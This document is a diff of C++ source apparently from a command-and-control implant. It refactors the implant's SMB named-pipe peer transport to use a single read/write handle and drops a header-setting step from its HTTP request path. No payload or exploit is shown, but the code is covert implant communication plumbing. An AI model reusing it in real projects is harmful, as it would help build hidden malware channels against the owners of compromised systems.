@@ -179,8 +179,7 @@ namespace Http {
 
         if (
             !(request = CreateRequestContext()) ||
-            !(proxy_ctx = CreateProxyContext(request)) ||
-            !SetHeaders(request)) {
+            !(proxy_ctx = CreateProxyContext(request))) {
             return_defer(ntstatus);
         }
 
@@ -261,7 +260,6 @@ namespace Smb {
 
         SID_IDENTIFIER_AUTHORITY sid_auth = SECURITY_WORLD_SID_AUTHORITY;
         SID_IDENTIFIER_AUTHORITY sid_label = SECURITY_MANDATORY_LABEL_AUTHORITY;
-
         EXPLICIT_ACCESSA access = { };
         PACL acl = { };
 
@@ -322,7 +320,7 @@ namespace Smb {
         uint32_t total = 0;
 
         do {
-            if (!Ctx->win32.ReadFile(Ctx->Config.EgressHandle, B_PTR(in->Buffer) + total, MIN((in->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &read), nullptr)) {
+            if (!Ctx->win32.ReadFile(handle, B_PTR(in->Buffer) + total, MIN((in->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &read), nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
                     return false;
                 }
@@ -340,7 +338,7 @@ namespace Smb {
         uint32_t write = 0;
 
         do {
-            if (!Ctx->win32.WriteFile(Ctx->Config.EgressHandle, B_PTR(out->Buffer) + total, MIN((out->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &write), nullptr)) {
+            if (!Ctx->win32.WriteFile(handle, B_PTR(out->Buffer) + total, MIN((out->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &write), nullptr)) {
                 return false;
             }
             total += write;
@@ -351,8 +349,7 @@ namespace Smb {
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
-        // ingress, the peer creates the handle
-        // egress, the peer waits for parent's handle
+        // single handle for in/out
 
         SECURITY_ATTRIBUTES sec_attr    = { };
         SMB_PIPE_SEC_ATTR smb_attr      = { };
@@ -390,14 +387,14 @@ namespace Smb {
             (*in)->Buffer = x_malloc(msg_length);
             (*in)->Length = msg_length;
 
-            PipeRead(*in);
+            PipeRead(handle, *in);
 
         } else {
             return_defer(ERROR_INSUFFICIENT_BUFFER);
         }
 
         if (out) {
-            if (!PipeWrite(out)) {
+            if (!PipeWrite(handle, out)) {
                 return_defer(ERROR_WRITE_FAULT);
             }
         }
